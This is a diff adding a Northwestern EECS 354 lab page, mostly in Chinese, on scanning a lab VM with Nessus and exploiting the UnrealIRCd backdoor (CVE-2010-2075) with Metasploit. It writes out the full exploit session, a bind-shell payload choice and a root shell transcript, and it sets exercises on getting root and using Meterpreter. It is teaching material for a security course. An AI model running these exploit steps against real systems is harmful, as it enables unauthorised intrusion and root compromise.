@@ -1,0 +1,281 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html><head>
+    <title>Network Penetration and Security — EECS 354 </title>
+    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
+    <link href="style/global.css" rel="stylesheet" type="text/css">
+    
+<link href="style/wiki.css" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+
+  <div id="header">
+    <h1>Network Penetration and Security</h1>
+    <h2>Northwestern EECS, Fall Quarter 2014</h2>
+  </div>
+  <ul id="navigation">
+    
+    <li><a href="http://hamsa.cs.northwestern.edu/">Home</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/schedule/">Schedule</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/readings/">Readings</a></li>
+    <li><a href="http://hamsa.cs.northwestern.edu/projects/">Projects</a></li>
+
+    
+    
+    <li class="right"><a href="http://hamsa.cs.northwestern.edu/login/">Login</a></li>
+    
+    <li class="right"><a href="http://groups.google.com/group/nuctf">Newsgroup</a></li>
+  </ul>
+  
+  <div id="content">
+    
+  
+  <p>﻿  </p><div id="content">
+<p></p>
+<p>  </p><h1>﻿Nessus</h1>
+<p></p>
+<h2>简介</h2>
+<p>Nessus 是一个漏洞扫描工具。它可以用于检测远程主机上成千上万的已知的潜在漏洞。Nessus被期望能够远离常见漏洞的管理员们广泛使用，用于防范常见的黑客攻击和病毒攻击。</p>
+<p>类似于nmap，Nessus可以针对目标计算机执行端口扫描。然而，nmap只告诉你什么在监听，而 Nessus 
+可以告诉你什么是易受攻击的。它可以完成此操作的一种方法是通过执行各种检查，以确定远程主机正在运行哪些服务(例如，Apache)，他们的版本编号 
+(例如，2.2.2)，然后检查针对的是那些版本的服务(例如，一个mod_rewrite 关闭的错误，<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3747"> CVE-2006年-3747</a>) 中存在的已知漏洞数据库。
+</p>
+<p>然而，这些用于检测漏洞的规则是高度灵活的。这些规则都包含在 Nessus 插件中，都由一种叫做 nasl (Nessus 攻击脚本语言) 
+脚本语言写成的。通常情况下，Nessus是能够检测每一个漏洞被作为一个插件。目前，Nessus附带有大约 40,000 
+个插件并且随着新漏洞的发现，每周都有数十个插件被添加。</p>
+<p>一般情况下，Nessus 实际上不执行任何漏洞利用 — — 它只检测漏洞。Nessus既不  防止攻击也不会试图纠正任何安全漏洞 — — 完全仍由网络管理员负责修补这些漏洞，但是Nessus会提供的指导。</p>
+<p>Nessus 可以和Metasploit一起使用。我们将首先扫描发现自身的弱点，然后使用 Metasploit 试图利用这些漏洞。我们将扫描的机器是 10.13.143.128。我们假设，我们的目标是获取此服务器上的shell。</p>
+<p>在 UNIX 上，Nessus可以根据客户机-服务器体系结构进行操作。Nessus 客户端连接到服务器上，为它提供了信息，然后在该服务器运行扫描。</p>
+
+<h2>扫描准备</h2>
+<p>Nessus开始通过运行端口扫描 (使用 nmap) 来确定目标主机上哪些端口是打开的。一旦开放端口标识被确认， 
+Nessus会在开放的端口上运行一套的漏洞利用插件。Nessus 假定标准端口 (即在端口 80 上的 http) 
+上运行的是标准的进程。它执行的最后一步是检查和报告漏洞。</p>
+<p>Nessus服务器安装在 <code>hamsa</code> 上。客户端是一个 Flash 应用程序，你可以通过浏览器访问。要使用客户端，只需连接到 <a href="https://hamsa.cs.northwestern.edu:8834/"> https://hamsa.cs.northwestern.edu:8834</a>。你可能需要确认安全异常，因为 Nessus 使用自签名的证书。你确认安全异常后，你将看到一个登录屏幕。<b>Log in with your hamsa username (NetID). The password is your seven-digit student ID.</b>
+</p>
+<p><img src="style/login.png" alt="Login">
+</p>
+<p>为了能够执行一次扫描，你需要有一个扫描策略。在 Nessus中，"policy"是指一套执行漏洞扫描的策略，包括但不限于使用的端口扫描器类型，相关选项、 超时、 各种插件选项、 报告选项，以及使用 SMB凭据或数据库共享。</p>
+<p>你不需要为此实验创建一套扫描策略，因为我们已经进行了扫描并生成一份报告供你浏览；然而，它仍然是非常重要的，你需要理解各种选项的含义，所以请
+仔细按照本节中的说明操作。扫描策略规定哪些漏洞是Nessus能够检测到的。而且如果你没有正确配置扫描策略，很容易错过严重安全隐患。</p>
+<p>为了创建新的策略，单击顶部"policy"选项卡，然后单击右上角附近的New Policy按钮：</p>
+<p><img src="style/policies.png" alt="Policies">
+</p>
+<p>你将被带到可以编辑策略选项的界面。默认的是常规选项卡，可以设置端口范围、 端口扫描程序的类型 (TCP、 UDP、 SYN 等)，其他基本选项。</p>
+<p><img src="style/addpolicy.png" alt="Add Policy">
+</p>
+<p>需要注意的是左边的选项卡: 一般、 凭据、 插件和首选项。此外，当你点击凭据或首选项时，下拉菜单会出现在页面的顶部附近。选择的范围是非常广泛的 (如果没有强制性的话)，你需要凭借自己的经验在菜单中微调这些选项值。</p>
+<p>值得特别强调的两个基本选项是端口扫描范围和安全检查选项。如果你知道你正在寻找哪些特定的服务中的漏洞，这可以节省大量的时间。如果你设置此选
+项，它将影响于TCP 和 UDP 扫描。二是"安全检查"选项，在高级设置被默认选择。这将确保 Nessus 
+不会尝试可能影响到目标主机的测试。例如当你扫描生产服务器时，这一项显然应该被选择。</p>
+<p><img src="style/port_scan_range.png" alt="Port Scan Range">
+</p>
+<p>为了检测这次实验相关漏洞，需要选择"首选项"页面上的下列选项:</p>
+<ul>
+ <li>在"Global variable settings"中，选择"Enable CGI scanning"以及"Thorough tests"。</li>
+
+<li>在"Web Application Tests Settings"中，勾选所有的选项。</li>
+</ul>
+<p>在其他地方，默认设置就足够完成这个实验了。如果你不能确定任何常规页上的设置，将鼠标移到选项和工具的名称上，大多数项目会出现提示。</p>
+<p>除了扫描策略以外，还有许多其他的选项。您可以提供大量的选项处理凭据给 
+Nessus，这样可以获得更完整和准确的扫描结果。这是非常有用的，例如，扫描一个系统中经过身份验证的用户可利用的潜在安全漏洞。如果你想要更好地理
+解Nessus能够实现的功能，我们推荐你阅读 <a href="http://static.tenable.com/documentation/nessus_5.0_user_guide.pdf"> 《Nessus 用户指南》</a>。
+</p>
+<p><img src="style/tooltip.png" alt="Tooltip">
+</p>
+
+<h2>运行扫描</h2>
+<p>你不需要实际运行这个实验的扫描。运行扫描需要一段时间，并且会生成大量的网络流量。因此，我们提供了一份完成的扫描报告。然而，如果你想要对你自
+己执行扫描，你会发现它是非常简单的。若要运行一次扫描，请单击顶部的"扫描模板"选项卡上，然后点击新扫描。给此扫描一个名称，选择你早些时候配置的扫
+描策略和输入你想要扫描的远程计算机的地址。</p>
+<p>点击运行扫描立即开始扫描。一旦启动扫描，扫描队列会显示所有当前正在运行的扫描。选择一个扫描之后, 你可以暂停、 恢复或完全停止扫描。当扫描完成时，它会从扫描队列中被移除，但可以"结果"选项卡上查看扫描结果。</p>
+
+<h2>扫描结果的解释</h2>
+<p>你可以通过<a href="http://hamsa.cs.northwestern.edu/media/nes/nessus_lab_report.nessus"> 这里</a> 将实验所需的报告下载并保存到本地计算机上。然后，在 Nessus的"结果"选项卡，单击"上传"，再选择你刚才保存的文件。
+</p>
+<p>在"结果"选项卡上，你应该可以看到列表中的所有正在运行或已完成的扫描。若要查看结果，请选择一个报表 (本实验中使用"netsec-2"报告) 并点击"浏览"。花一些时间浏览一下报告，看看有什么样的信息。</p>
+<p>现在，我们已经确定机器上的一些潜在的漏洞，让我们看看是否继续利用它们。但是有十几个"高"和"严重性"的漏洞可供选择，我们怎么选呢?</p>
+<p><img src="style/scan_results_toplevel.png" alt="Scan Results">
+</p>
+<p>首先，值得注意是并不是所有结果对我们来说都是有用的。与严重程度无关，而取决于我们的目标是什么。</p>
+
+<p>再次注意， Nessus相对与nmap之类的简单端口扫描工具的优势在于：端口扫描程序只可以告诉你哪些端口是打开的，而 Nessus 运行一系列测试，以确定哪些软件包运行在服务器上，并在许多情况下，甚至包含他们的版本编号和配置选项。</p>
+<p>但是，请注意这里有一个关键级别的漏洞。这些通常总是与远程执行代码有关的，并且很容易就可以获得shell:<code>Unreal IRC Daemon Backdoor Detection</code>
+</p>
+<p><img src="style/uircd_backdoor.png" alt="Vulnerable service that may allow arbitrary command execution">
+</p>
+<p>这看起来很有前途。让我们尝试在 Metasploit中利用此漏洞。</p>
+
+<h2>漏洞利用</h2>
+<p>首先，请注意在Nessus扫描结果的CVE编号: CVE-2010年-2075。CVE (常见的漏洞和风险) 
+是公开的包含已知安全漏洞的大型数据库，每一个都是由"CVE 标识符"唯一地表示，如 CVE-2010-2075。在CVE 
+网站上，可获得的每个安全漏洞有关的信息。当它发生时，我们发现该漏洞的CVE条目不提供任何Nessus告诉我们之外的信息，然而，知道这一数字暂时是
+有用的。</p>
+<p>接下来， 使用命令 <code>msfpro</code> 连接 Metasploit(不是 <code>msfconsole</code>)。运行 CVE 编号搜索:
+</p>
+<pre><code>msf &gt; search CVE:2010-2075
+
+Matching Modules
+================
+
+Name                                        Disclosure Date          Rank       Description
+   ----                                        ---------------          ----       -----------
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12 00:00:00 UTC  excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
+</code></pre><p>如果 CVE 搜索不能工作，你或者可以搜索"ircd"。或者你可以只是谷歌"CVE:xxx 
+metasploit"。在这种情况下，它仍然会返回相同的漏洞，但有时可能有比nessus发现更多的漏洞。然而，并不保证所有的都能符合在服务器运行
+的特定版本。如果你也认为漏洞利用与对于服务的各种配置、设置相关，那么，这就是为什么在大多数情况下使用Nessus提供的CVE号码比搜索服务的名称
+更好。</p>
+<p>您可以使用info命令来获取一些有关该漏洞的详细信息：</p>
+<pre><code>msf &gt;  info exploit/unix/irc/unreal_ircd_3281_backdoor
+
+Name: UnrealIRCD 3.2.8.1 Backdoor Command Execution
+     Module: exploit/unix/irc/unreal_ircd_3281_backdoor
+   Platform: Unix
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+
+Provided by:
+  hdm <hdm@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic Target
+
+Basic options:
+  Name   Current Setting  Required  Description
+  ----   ---------------  --------  -----------
+  RHOST                   yes       The target address
+  RPORT  6667             yes       The target port
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a malicious backdoor that was added to the
+  Unreal IRCD 3.2.8.1 download archive. This backdoor was present in
+  the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th
+  2010.
+
+References:
+  http://cvedetails.com/cve/2010-2075/
+  http://www.osvdb.org/65445
+  http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
+
+</hdm@metasploit.com></code></pre><p>让我们在这个脆弱的 VM 上的尝试利用漏洞。首先先告诉 Metasploit 来利用此漏洞：</p>
+<p><code>msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor</code>
+</p>
+
+<p>让我们看看有什么关于该漏洞的有效内容：</p>
+<pre><code>msf exploit(unreal_ircd_3281_backdoor) &gt; show payloads
+
+Compatible Payloads
+===================
+
+Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double reverse TCP (telnet)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+</code></pre><p>这里有很多方法可以让我们获得一个 shell。简单起见，让我们选择<code>cmd/unix/bind_ruby</code>
+</p><pre><code>msf exploit(unreal_ircd_3281_backdoor) &gt; set PAYLOAD cmd/unix/bind_ruby
+payload =&gt; cmd/unix/bind_ruby
+</code></pre>
+
+<p></p>
+<p>现在，还有其他哪些选项？看看利用该漏洞还需要什么，请使用命令：<code>show options</code>:
+</p>
+<pre><code>msf &gt; show options
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                        yes       The target address
+   RPORT  6667             yes       The target port
+
+Payload options (cmd/unix/bind_ruby):
+
+Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                        yes       The listen address
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+Id  Name
+   --  ----
+   0   Automatic Target
+
+</code></pre><p>我们看到，我们需要设置 <code>RHOST</code>。我们可以把 <code>RPORT</code> 设置在 6667。
+</p>
+<pre><code>msf exploit(unreal_ircd_3281_backdoor)&gt; set RHOST 10.13.143.128
+RHOST =&gt;10.13.143.128</code></pre>现在，设置 LPORT来告诉它要绑定到shell哪个端口。请记住更改 LPORT，因为可能会有其他学生在机器上使用相同的端口。现在，我们就可以开始利用。<p></p>
+
+<pre><code>
+msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
+[*] Started bind handler
+[*] Connected to 10.13.143.128:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] Sending backdoor command...
+[*] Command shell session 2 opened (10.13.143.1:52768 -&gt; 10.13.143.128:4444) at 2014-05-27 18:55:35 -0500
+
+whoami
+root
+ls
+Donation
+LICENSE
+aliases
+badwords.channel.conf
+badwords.message.conf
+badwords.quit.conf
+curl-ca-bundle.crt
+dccallow.conf
+doc
+help.conf
+ircd.log
+ircd.pid
+ircd.tune
+modules
+networks
+spamfilter.conf
+tmp
+unreal
+unrealircd.conf
+exit
+</code></pre>
+<h2>课堂练习</h2>
+<p>浏览Nessus的扫描结果，看看是否能找到另一种方式来获取服务器的root访问权限。这里有几个漏洞，所以你可能能够得到一种方法。一般来说，
+当你获得在服务器上的远程shell时，您将登录一个没有特权的帐户。在这个实验中，关键的 vulnerabilitie 允许你获得 <code>root</code> (你可以通过运行命令 <code>whoami</code>来查看)。你会发现通过这个帐户没有太多可以做的 (例如，请尝试删除或修改 <code>/var/www/index.html</code>，例如)。对于本练习，请尝试得到一个 root shell。如果你能得到 www 数据访问，只能得到一半的分数。如果 vsftpd 漏洞利用失败而你又想要使用它，或者你需要使用 msfpro，发送电子邮件给安德鲁。
+</p>
+
+<h2>可选练习</h2>
+<p><strong>Meterpreter Shell:</strong> 许多漏洞在Meterpreter 
+shell中都有可作为有效载荷的选项。Meterpreter是一个相当复杂的开发框架，有助于成功地利用了远程的主机之后，完成包括与进程交互、 
+上传文件，和与文件系统和网络交互等许多任务。Meterpreter 还具有其他重要的攻击优势，包括隐身 
+(与不同shell不同的是，Meterpreter并不产生新的进程; 它也有能力对其通信进行加密)，可扩展性和熟练性 
+(无论目标机器使用什么样的操作系统，Meterpreter 支持相同的命令)。作为一次练习，请尝试将有效载荷切换为Meterpreter 
+shell并且使用它。使用 <code>help</code> 命令来查看哪些命令可用。为更详细的概览Meterpreter 和它的能力，亲查阅<a href="http://www.nologin.org/Downloads/Papers/meterpreter.pdf"> Meterpreter 白皮书 PDF</a>。
+</p>
+
+</div>
+
+
+
+
+
+  </div>
+
+
+
+</body></html>
